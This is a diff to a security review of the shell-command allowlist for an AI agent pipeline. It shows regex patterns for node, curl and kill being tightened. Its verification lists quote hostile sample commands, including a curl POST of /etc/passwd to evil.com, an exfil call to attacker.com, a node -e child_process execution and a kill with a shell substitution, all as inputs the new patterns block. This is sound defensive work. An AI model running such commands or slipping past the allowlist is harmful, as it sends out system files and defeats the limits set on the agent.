@@ -12,15 +12,15 @@
 
 ## Round 1 Finding Resolution Status
 
-| R1 ID | Severity | Title | Status |
-|-------|----------|-------|--------|
-| S-1 | Critical | `^node .+` allows arbitrary code execution | **RESOLVED** — pattern tightened to `^node \.[\\/].+\.m?[jt]s$` |
-| S-2 | Critical | `^curl -s .+` allows arbitrary HTTP requests | **RESOLVED** — pattern tightened to `^curl -sf?o? https?://localhost[:/]` |
-| S-3 | Major | `^(kill\|taskkill)` allows killing any OS process | **RESOLVED** — pattern tightened to `^(kill (-[0-9]+ )?[0-9]+\|taskkill /F /PID [0-9]+)$` |
-| S-4 | Major | Incomplete PID orphan recovery on agent crash | **UNRESOLVED** — not in fix scope (design-level gap) |
-| S-5 | Minor | Allowlist pattern order inconsistency | **UNRESOLVED** — patterns #1/#2 still swapped between e2e-integration.md and tool-access-matrix.md |
-| A-1 | Major | Verifier trust boundary instruction-enforced only | **UNRESOLVED** — accepted risk per tool-access-matrix.md §11 |
-| C-1 | Major | TASK-004 line count discrepancy | **UNRESOLVED** — informational process observation |
+| R1 ID | Severity | Title                                             | Status                                                                                             |
+| ----- | -------- | ------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
+| S-1   | Critical | `^node .+` allows arbitrary code execution        | **RESOLVED** — pattern tightened to `^node \.[\\/].+\.m?[jt]s$`                                    |
+| S-2   | Critical | `^curl -s .+` allows arbitrary HTTP requests      | **RESOLVED** — pattern tightened to `^curl -sf?o? https?://localhost[:/]`                          |
+| S-3   | Major    | `^(kill\|taskkill)` allows killing any OS process | **RESOLVED** — pattern tightened to `^(kill (-[0-9]+ )?[0-9]+\|taskkill /F /PID [0-9]+)$`          |
+| S-4   | Major    | Incomplete PID orphan recovery on agent crash     | **UNRESOLVED** — not in fix scope (design-level gap)                                               |
+| S-5   | Minor    | Allowlist pattern order inconsistency             | **UNRESOLVED** — patterns #1/#2 still swapped between e2e-integration.md and tool-access-matrix.md |
+| A-1   | Major    | Verifier trust boundary instruction-enforced only | **UNRESOLVED** — accepted risk per tool-access-matrix.md §11                                       |
+| C-1   | Major    | TASK-004 line count discrepancy                   | **UNRESOLVED** — informational process observation                                                 |
 
 ---
 
@@ -35,6 +35,7 @@
 **Fix applied:** Pattern #4 changed to `^node \.[\\/].+\.m?[jt]s$` in both [e2e-integration.md §5](NewAgents/.github/agents/e2e-integration.md#L370) and [tool-access-matrix.md §8.2](NewAgents/.github/agents/tool-access-matrix.md#L79).
 
 **Verification:**
+
 - Blocks `node -e "require('child_process').execSync('...')"` — `-e` does not match `\.[\\/]` (requires `./` or `.\` path prefix). ✅
 - Blocks `node arbitrary-script.js` — no `./` prefix. ✅
 - Blocks `node ./script.js --inject-flag` — `$` anchor requires string to END with `.m?[jt]s`. ✅
@@ -50,6 +51,7 @@
 **Fix applied:** Pattern #7 changed to `^curl -sf?o? https?://localhost[:/]` in both [e2e-integration.md §5](NewAgents/.github/agents/e2e-integration.md#L373) and [tool-access-matrix.md §8.2](NewAgents/.github/agents/tool-access-matrix.md#L82).
 
 **Verification:**
+
 - Blocks `curl -s https://attacker.com/exfil` — only `localhost` target allowed. ✅
 - Blocks `curl -s -X POST -d @/etc/passwd https://evil.com` — non-localhost rejected. ✅
 - Allows `curl -s https://localhost:8080/health` — legitimate health check. ✅
@@ -65,6 +67,7 @@
 **Fix applied:** Pattern #8 changed to `^(kill (-[0-9]+ )?[0-9]+|taskkill /F /PID [0-9]+)$` in both [e2e-integration.md §5](NewAgents/.github/agents/e2e-integration.md#L374) and [tool-access-matrix.md §8.2](NewAgents/.github/agents/tool-access-matrix.md#L83).
 
 **Verification:**
+
 - Blocks `taskkill /F /IM *` — no `/IM` allowed, only `/PID` with numeric value. ✅
 - Blocks `kill -9 $(cat /etc/hostname)` — `$` anchor prevents trailing shell injection. ✅
 - Allows `kill -9 12345` and `taskkill /F /PID 12345` — numeric PID teardown. ✅
@@ -120,13 +123,14 @@ No new architecture findings. The fixes did not alter the architectural structur
 
 **Fix applied:** EG-10 queries in [sql-templates.md §6](NewAgents/.github/agents/sql-templates.md#L629) now reference:
 
-| Lane | check_names | Producer |
-|------|-------------|----------|
-| `unit-only` | `baseline-captured`, `tdd-compliance` | Verifier Tier 0/1, Tier 2 |
-| `unit-integration` | `baseline-captured`, `tdd-compliance`, `behavioral-coverage` | Verifier Tier 0/1, Tier 2 |
-| `full-tdd-e2e` | `baseline-captured`, `tdd-compliance`, `behavioral-coverage`, `e2e-test-execution` | Verifier Tier 0/1, Tier 2, Tier 5 |
+| Lane               | check_names                                                                        | Producer                          |
+| ------------------ | ---------------------------------------------------------------------------------- | --------------------------------- |
+| `unit-only`        | `baseline-captured`, `tdd-compliance`                                              | Verifier Tier 0/1, Tier 2         |
+| `unit-integration` | `baseline-captured`, `tdd-compliance`, `behavioral-coverage`                       | Verifier Tier 0/1, Tier 2         |
+| `full-tdd-e2e`     | `baseline-captured`, `tdd-compliance`, `behavioral-coverage`, `e2e-test-execution` | Verifier Tier 0/1, Tier 2, Tier 5 |
 
 **Verification:**
+
 - `baseline-captured`: Produced by verifier at [step 1.4](NewAgents/.github/agents/verifier.agent.md#L165) with `passed=1` on successful cross-check. ✅
 - `tdd-compliance`: Produced by verifier per [sql-templates.md §2a](NewAgents/.github/agents/sql-templates.md#L280). ✅
 - `behavioral-coverage`: Produced by verifier per [check_name reference table](NewAgents/.github/agents/verifier.agent.md#L122). ✅
